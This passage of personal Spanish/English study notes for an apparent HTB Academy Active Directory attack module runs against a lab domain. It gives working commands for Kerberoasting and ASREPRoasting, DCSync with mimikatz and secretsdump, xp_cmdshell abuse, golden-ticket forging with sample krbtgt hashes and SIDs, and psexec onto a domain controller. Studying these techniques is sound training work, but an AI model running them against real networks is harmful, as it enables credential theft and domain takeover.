Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6c26baf1-bf54-4848-950b-9c940c8bbec6)


De la información anterior, podemos ver que todos los usuarios del dominio (es decir, alllos usuarios del dominio) pueden utilizar RDP en este host. Es común ver esto en hosts de Servicios de Escritorio remoto (RDS) o hosts utilizados como hosts de salto.

Algo que dice que hace es: Checa que el grupo Domain Users que permisos tienen sobre que host.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/52809843-7aa8-4922-9870-7c34d3478095)

Bueno y el troble shooting 

```
De alguna formano jala el smbclient no se proque entonces use el mount

sudo mount -t cifs -o username=root,password=toor  //192.168.0.29/Ejemplo /mnt/Windows/
```

De igual manera se puede conectar desde el GUI de Kali:

```
# Le pones en en la barra de busqueda de cualquier carpeta

smb://IP/share y te muestra esta pantalla pones el dominio y no hay pierde
```
![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6eab3f97-698b-41ee-8086-5b8349f0c621)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/692c0229-33a1-4d6d-87cb-03302ee281d8)


En execution Rights podemos ver que el usuario WLEY esta en el grupo Domain Users el cual tiene permiso de RPD en ACADEMY-AEetc.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/a7ac96c4-9840-408d-b897-95ac6d9e9114)

También podríamos consultar la Analysispestaña y ejecutar las consultas prediseñadas Find Workstations where Domain Users can RDP o Find Servers where Domain Users can RDP.

### Enumeración del grupo de usuarios de administración remota

Para saber si el usuario que tenemos esta en el grupo de Remote Managment Users.

```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/4491ee80-0b2a-4509-a47c-224cc2694e63)


Ahora sepuede hacer esto mismo pero a nivel de todo el dominio. Lo que vemos en la captura es que el usuario forerend esta dentro de ese grupo para esta maquina pero si queremos ver de todo el dominio nos deja una query

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/afa5378f-48bb-46d3-805d-3212801fd2ff)

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

Una vez que vimos que el usuario forend se encuentra en el grupo de Remote Managmente de la maquina ACADEMY-EA-MS01 que es en la que tenemos logeado el usuario htb-user.

```
ruby evil-winrm.rb -i 10.129.196.236 -u forend
## Desde Windows
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-DB01
[ACADEMY-EA-DB01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```
![image](https://github.com/gecr07/HTB-Academy/assets/63270579/bfdcbad4-4ab3-4c6c-89f2-7c25c21314a4)

## Administrador de SQL Server

BloodHound, una vez más, es una gran apuesta para encontrar este tipo de acceso a través del SQLAdminborde. Podemos buscar SQL Admin Rightsen la Node Infopestaña de un usuario determinado o usar esta consulta Cypher personalizada para buscar:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/6cc9ab6f-86bd-49ec-a3ae-a958c6bdad95)


Aquí vemos un usuario que damundsentiene SQLAdminderechos sobre el host ACADEMY-EB-DB01. Con los permisos que tenemos cambiamos el password de la cuenta de dam y nos podriamos loggear a la base de datos y ejecutar comandos.


```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

Luego podríamos optar enable_xp_cmdshellpor habilitar el procedimiento almacenado xp_cmdshell que permite ejecutar comandos del sistema operativo a través de la base de datos si la cuenta en cuestión tiene los derechos de acceso adecuados.

Finalmente, podemos ejecutar comandos en el formato xp_cmdshell <command>. Aquí podemos enumerar los derechos que nuestro usuario tiene en el sistema y ver que tenemos SeImpersonatePrivilege , que se puede aprovechar en combinación con una herramienta como JuicyPotato , PrintSpoofer o RoguePotato para escalar SYSTEMprivilegios de nivel, según el host de destino, y Utilice este acceso para continuar hacia nuestro objetivo. Estos métodos se tratan en SeImpersonate and SeAssignPrimaryTokenel módulo Escalamiento de privilegios de Windows .

```
xp_cmdshell whoami /priv
```

## Problema de "doble salto" de Kerberos

Existe un problema conocido como problema de "doble salto" que surge cuando un atacante intenta utilizar la autenticación Kerberos en dos (o más) saltos. El problema tiene que ver con cómo se otorgan los tickets de Kerberos para recursos específicos. Los tickets de Kerberos no deben verse como contraseñas. Son datos firmados del KDC que indican a qué recursos puede acceder una cuenta. Cuando realizamos la autenticación Kerberos, obtenemos un "ticket" que nos permite acceder al recurso solicitado (es decir, una sola máquina). Por el contrario, cuando usamos una contraseña para autenticarnos, ese hash NTLM se almacena en nuestra sesión y puede usarse en otro lugar sin problemas.


***wsmprovhost.exe***, que es el proceso que se genera cuando se genera una sesión remota de Windows PowerShell.


```
tasklist /V |findstr backupadm

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/d2f0124a-e746-432f-9370-5fd7173d8651)


> El problema del "doble salto" ocurre a menudo cuando se usa WinRM/Powershell ya que el mecanismo de autenticación predeterminado solo proporciona un ticket para acceder a un recurso específico. Es probable que esto cause problemas al intentar realizar un movimiento lateral o incluso acceder a archivos compartidos desde el shell remoto. En esta situación, la cuenta de usuario que se utiliza tiene derechos para realizar una acción pero se le niega el acceso. La forma más común de obtener shells es atacando una aplicación en el host de destino o utilizando credenciales y una herramienta como PSExec. En ambos escenarios, la autenticación inicial probablemente se realizó a través de SMB o LDAP, lo que significa que el NTLM Hash del usuario se almacenaría en la memoria. A veces tenemos un conjunto de credenciales y estamos restringidos a un método particular de autenticación, como WinRM, o preferimos usar WinRM por diversos motivos.

## Bleeding Edge Vulnerabilities

### NoPac (suplantación de nombre de cuenta Sam)

Esta vulnerabilidad permite escalar privilegios desde un usuario estandar se vale de que cada usuario puede agregar hasta 10 equipos por lo que entendi  aprovecha la posibilidad de cambiar la SamAccountNamecuenta de una computadora a la de un controlador de dominio.
(ms-DS-MachineAccountQuota = 10)

> Esta vulnerabilidad abarca dos CVE 2021-42278 y 2021-42287 , lo que permite la escalada de privilegios dentro del dominio por parte de cualquier usuario de dominio estándar. al acceso a nivel de administrador de dominio con un solo comando. A continuación se muestra un desglose rápido de lo que proporciona cada CVE con respecto a esta vulnerabilidad.

> Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/86a07234-85eb-40c9-a4b5-ea6bbb1646f7)

 ### PrintNightmare

PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution.

We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.

```
 rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

## PetitPotam (MS-EFSRPC)

PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC). 

## Configuraciones erróneas varias

### Membresía de grupo relacionado con Exchange

 El grupo Exchange Windows Permissionsno figura como grupo protegido, pero a los miembros se les otorga la capacidad de escribir una DACL en el objeto de dominio. Esto se puede aprovechar para otorgar privilegios de DCSync al usuario. Un atacante puede agregar cuentas a este grupo aprovechando una configuración incorrecta de DACL (posible) o aprovechando una cuenta comprometida que sea miembro del grupo Operadores de cuentas.

El grupo Exchange Organization Managementes otro grupo extremadamente poderoso (efectivamente, los "Administradores de dominio" de Exchange) y puede acceder a los buzones de correo de todos los usuarios del dominio. No es raro que los administradores de sistemas sean miembros de este grupo. Este grupo también tiene control total de la unidad organizativa llamada Microsoft Exchange Security Groups, que contiene el grupo Exchange Windows Permissions.

### PrivExchange

El PrivExchangeataque es el resultado de una falla en la PushSubscriptionfunción Exchange Server, que permite a cualquier usuario de dominio con un buzón forzar al servidor Exchange a autenticarse en cualquier host proporcionado por el cliente a través de HTTP.

### Printer Bug

El error de la impresora es una falla en el protocolo MS-RPRN (Protocolo remoto del sistema de impresión). Este protocolo define la comunicación del procesamiento de trabajos de impresión y la gestión del sistema de impresión entre un cliente y un servidor de impresión. Para aprovechar esta falla, cualquier usuario de dominio puede conectarse a la canalización con nombre del spool con el RpcOpenPrintermétodo y utilizar el RpcRemoteFindFirstPrinterChangeNotificationExmétodo, y forzar al servidor a autenticarse en cualquier host proporcionado por el cliente a través de SMB.

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

We can use tools such as the Get-SpoolStatus module from this tool (that can be found on the spawned target) or this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.


## Enumerating DNS Records ( ver la documentacion si quieres ver mas)

Podemos utilizar una herramienta como adidnsdump para enumerar todos los registros DNS de un dominio utilizando una cuenta de usuario de dominio válida. Esto es especialmente útil si la convención de nomenclatura para hosts vuelve a aparecer en nuestra enumeración mediante herramientas BloodHoundcomo SRV01934.INLANEFREIGHT.LOCAL. Si todos los servidores y estaciones de trabajo tienen un nombre no descriptivo, nos resulta difícil saber qué atacar exactamente. Si podemos acceder a las entradas DNS en AD, podemos descubrir potencialmente registros DNS interesantes que apunten a este mismo servidor, como JENKINS.INLANEFREIGHT.LOCAL, que podemos utilizar para planificar mejor nuestros ataques.

```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```

### Contraseña en el campo Descripción

Con powerview 

```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null} 
```

### PASSWD_NOTREQD Field

It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line.


```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain.

```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

Es improtante ver que asi se puede enumerar un share desde powershell.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/9ec9bb93-8325-4c07-b46d-2a555d7ab5c5)


Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the --local-auth flag as shown in this module's Internal Password Spraying - from Linux section.

```
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```

### Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ed383494-3a63-4971-a6c5-50974ff73bd2)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/e07f8744-74d3-4746-ae90-433c4f70e1e2)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/0108f120-d114-4df0-b158-753083c08dec)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/ebf29a17-049d-4d1d-a67d-b30e2cb6f505)


### ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

> Con la autenticación previa, un usuario ingresa su contraseña, que cifra una marca de tiempo. El controlador de dominio lo descifrará para validar que se utilizó la contraseña correcta. Si tiene éxito, se emitirá un TGT al usuario para futuras solicitudes de autenticación en el dominio. Si una cuenta tiene la autenticación previa deshabilitada, un atacante puede solicitar datos de autenticación para la cuenta afectada y recuperar un TGT cifrado del controlador de dominio. Esto puede estar sujeto a un ataque de contraseña fuera de línea utilizando una herramienta como Hashcat o John the Ripper.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/da669948-6cc3-4372-b38b-c808421b6514)


ASREPRoasting es similar a Kerberoasting, pero implica atacar el AS-REP en lugar del TGS-REP. No se requiere un SPN. Esta configuración se puede enumerar con PowerView o herramientas integradas como el módulo PowerShell AD.

. Si un atacante tiene GenericWritepermisos GenericAllsobre una cuenta, puede habilitar este atributo y obtener el ticket AS-REP para descifrar fuera de línea para recuperar la contraseña de la cuenta antes de deshabilitar el atributo nuevamente. Al igual que Kerberoasting, el éxito de este ataque depende de que la cuenta tenga una contraseña relativamente débil.

```
#Enumeración del valor DONT_REQ_PREAUTH utilizando Get-DomainUser

Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl


```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/bd4eeab4-76c5-49b9-8c79-180af59050aa)


With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

```
# We can then crack the hash offline using Hashcat with mode 18200.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```

La herramienta Kerbrute nos muestra cuando encuentra usuarios asi:


```
# When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
# Linux

 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

```
With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. 

```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```

> La Política de grupo proporciona a los administradores muchas configuraciones avanzadas que se pueden aplicar tanto al usuario como a los objetos de la computadora en un entorno AD. La política de grupo, cuando se usa correctamente, es una excelente herramienta para reforzar un entorno de AD mediante la configuración de los ajustes del usuario, los sistemas operativos y las aplicaciones. Dicho esto, los atacantes también pueden abusar de la Política de grupo. Si podemos obtener derechos sobre un objeto de política de grupo a través de una mala configuración de ACL, podríamos aprovechar esto para el movimiento lateral, la escalada de privilegios e incluso el compromiso del dominio y como un mecanismo de persistencia dentro del dominio. Comprender cómo enumerar y atacar los GPO puede darnos una ventaja y, a veces, puede ser el boleto para lograr nuestro objetivo en un entorno bastante cerrado.


## Abuso de objetos de política de grupo (GPO)

La Política de grupo proporciona a los administradores muchas configuraciones avanzadas que se pueden aplicar tanto al usuario como a los objetos de la computadora en un entorno AD. La política de grupo, cuando se usa correctamente, es una excelente herramienta para reforzar un entorno de AD mediante la configuración de los ajustes del usuario, los sistemas operativos y las aplicaciones. Dicho esto, los atacantes también pueden abusar de la Política de grupo. Si podemos obtener derechos sobre un objeto de política de grupo a través de una mala configuración de ACL, podríamos aprovechar esto para el movimiento lateral, la escalada de privilegios e incluso el compromiso del dominio y como un mecanismo de persistencia dentro del dominio. Comprender cómo enumerar y atacar los GPO puede darnos una ventaja y, a veces, puede ser el boleto para lograr nuestro objetivo en un entorno bastante cerrado.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/b19135e8-f0c4-465f-96f3-ed2251758220)

#### Enumerar nombres de GPO con PowerView

```
Get-DomainGPO |select displayname

```
![image](https://github.com/gecr07/HTB-Academy/assets/63270579/1004f7de-f793-4be7-a82a-8ce5c0f78469)

Esto puede ser útil para que podamos comenzar a ver qué tipos de medidas de seguridad existen (como denegar el acceso a cmd.exe y una política de contraseña separada para las cuentas de servicio). Podemos ver que el inicio de sesión automático está en uso, lo que puede significar que hay una contraseña legible en un GPO, y ver que los Servicios de certificados de Active Directory (AD CS) están presentes en el dominio. Si las herramientas de administración de políticas de grupo están instaladas en el host desde el que estamos trabajando, podemos usar varios cmdlets de GroupPolicy integrados para Get-GPOrealizar la misma enumeración.


```
Get-GPO -All | Select DisplayName
```

A continuación, podemos comprobar si un usuario que podemos controlar tiene algún derecho sobre un GPO. A usuarios o grupos específicos se les pueden otorgar derechos para administrar uno o más GPO. Una buena primera comprobación es ver si todo el grupo de usuarios del dominio tiene derechos sobre uno o más GPO.


```
## PowerView
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/2440fd48-f361-43a8-990e-4769122e56e4)

```
Conversión de GUID de GPO a nombre

Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

```

> Podríamos utilizar una herramienta como SharpGPOAbuseaprovechar esta configuración incorrecta de GPO realizando acciones como agregar un usuario que controlamos al grupo de administradores locales en uno de los hosts afectados, crear una tarea programada inmediata en uno de los hosts para brindarnos un shell inverso o configurar un script de inicio de computadora malicioso para proporcionarnos un shell inverso o similar. Al utilizar una herramienta como esta, debemos tener cuidado porque se pueden ejecutar comandos que afectan a todas las computadoras dentro de la unidad organizativa a la que está vinculado el GPO. Si encontramos un GPO editable que se aplica a una unidad organizativa con 1000 computadoras, no querríamos cometer el error de agregarnos como administrador local a tantos hosts. Algunas de las opciones de ataque disponibles con esta herramienta nos permiten especificar un usuario o host objetivo. Los hosts que se muestran en la imagen de arriba no son explotables,

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/abde54cc-fae7-459b-9053-183a30891361)


## TRUSTS

A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/1ae74a5b-1057-4fb2-8455-cc50492364c2)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/9a398a2f-f108-4cbd-bca0-5e038ac28540)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/7b2b2902-effa-4a25-ba9a-1bb678beae71)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/bffe2a5d-63ad-438b-9868-b5094e9682ba)


## Enumerating Trust Relationships

We can use the Get-ADTrust cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.

```
Import-Module activedirectory
Get-ADTrust -Filter *

# PowerView

 Get-DomainTrust
 Get-DomainTrustMapping
#From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName


```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/3833cb64-c9ee-4ef6-98d7-88859afb079a)


## Attacking Domain Trusts - Child -> Parent Trusts - from Windows

The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/eb955e64-79c0-4016-a49c-013ce5d3b0a3)


### ExtraSIDs

Ahora podemos recopilar todos los datos necesarios para realizar el ataque ExtraSids. Primero, necesitamos obtener el hash NT para KRBTGT.cuenta, que es una cuenta de servicio para el Centro de distribución de claves (KDC) en Active Directory. La cuenta KRB (Kerberos) TGT (Ticket Granting Ticket) se utiliza para cifrar/firmar todos los tickets Kerberos otorgados dentro de un dominio determinado. Los controladores de dominio utilizan la contraseña de la cuenta para descifrar y validar tickets de Kerberos. La cuenta KRBTGT se puede utilizar para crear tickets Kerberos TGT que se pueden utilizar para solicitar tickets TGS para cualquier servicio en cualquier host del dominio. Esto también se conoce como ataque Golden Ticket y es un mecanismo de persistencia bien conocido para los atacantes en entornos de Active Directory. La única forma de invalidar un Golden Ticket es cambiar la contraseña de la cuenta KRBTGT, lo que debe hacerse periódicamente y definitivamente después de una evaluación de prueba de penetración donde se alcanza el compromiso total del dominio.


```
Obtención del NT Hash de la cuenta KRBTGT usando Mimikatz
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# PowerView

Get-DomainSID

Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"

Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

## Creating a Golden Ticket with Mimikatz

 kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

```

### Ejercicio

Vemos cuales son los Trust aunque se podria hacer con PowerView use el modulo de AD. Vemos cual es el child pues no fijamos en el campo IntraForest esta en True. ( ahi entonces dice que significa que es child).

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/d698af2e-84e9-4910-ad8d-961e88dfa387)

```
Get-ADTrust
Get-DomainTrust
Get-DomainTrustMapping
# Powerview
What is the SID of the Enterprise Admins group in the root domain?
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid


```
Para hacer este ataque se tiene que tener comprometido el child domain y la cuenta (The KRBTGT hash for the child domain). ( si quieres ver mas ve a la pagina es muy extenso)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5ed05d30-d6cd-47fc-ad23-c7ee99d582b5)


Ya que se ingreso el golden ticket en la memoria

```
ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids
ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
```

### En linux

Para obtener la info pero desde linux Primero DCSYNC

```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

Para encontrar el SID del child domain

```
 lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
Aqui recuerda que se hace contra el DC ( nose porque pero desde que empece a estudiar asi es)

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/a6c4582f-9283-49c7-a902-2408b7e80a9e)

El siguiente comando lo usa para encontrar el SID del grupo Enterprise Admins ( ve como es contra el DC del dominio parent)

```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

Algo super interesante si nos damos cuenta en la captura el SID del grupo Enterprise Admins se le agrega solamente el 519 al final y dependiendo de que grupo seria lo que se le agregaria.

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/d5396e50-4840-461f-b26a-8b0469466fcc)


![image](https://github.com/gecr07/HTB-Academy/assets/63270579/c0930dc0-ccad-4495-b4d5-e8470e71a038)


Para crear el golden ticket

```
 ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/57d864c6-b4b7-4660-8e2d-3f2bd56765ff)


```
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

### Ejercicio

Pues para el ejercicio ya tendriamos un golden ticket entonces podemos hacer lo que sea en este caso un DCSYNC lo hice con el usuario admunn y con el hacket que creamos pero no se te olivde exportar la variable que tiene el golden ticket o no va a funcionar

```
export KRB5CCNAME=hacker.ccache
secretsdump.py -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
## Es mejor decirle que nos guarde todod como con el usuario admunn
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```
## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

En resumen nos dice de se puede hacer kerberoasting si se tienen un dominio con trust forest bidireccional.

```
## Primero sacanos los usuarios del otro domino con SPN asociados

Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

## Despues procedemos a sacar el hash

Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

## Conseguir el hash para crackearlo

.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

## Hashcat

.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap


hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

```

![image](https://github.com/gecr07/HTB-Academy/assets/63270579/9ff805a4-aaa2-405a-9189-cd3cf82a302d)

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux









